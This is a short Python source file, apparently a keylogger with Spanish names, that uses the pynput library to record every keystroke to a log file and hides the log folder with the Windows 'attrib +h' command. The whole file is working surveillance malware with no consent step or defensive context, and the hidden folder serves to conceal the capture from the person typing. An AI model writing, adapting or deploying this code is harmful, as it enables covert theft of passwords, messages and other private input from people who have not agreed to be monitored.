import sys
import os
from pynput import keyboard as kb
from getpass import getuser

def pulsa(tecla):
    valor = str(tecla).replace("'", "")
    if valor == "Key.space":
        valor = " "
    elif valor == "Key.enter":
        valor = "\n"
    elif valor == "Key.shift_r" or valor == "Key.shift":
        valor = ""
    with open(f"RUTA/keys/keys", "a") as log:
        log.write(valor)

user = getuser()
os.makedirs(f"RUTA/keys", exist_ok = True)
os.system(f"attrib +h RUTA/keys")

with kb.Listener(pulsa) as escuchador:
    escuchador.join()
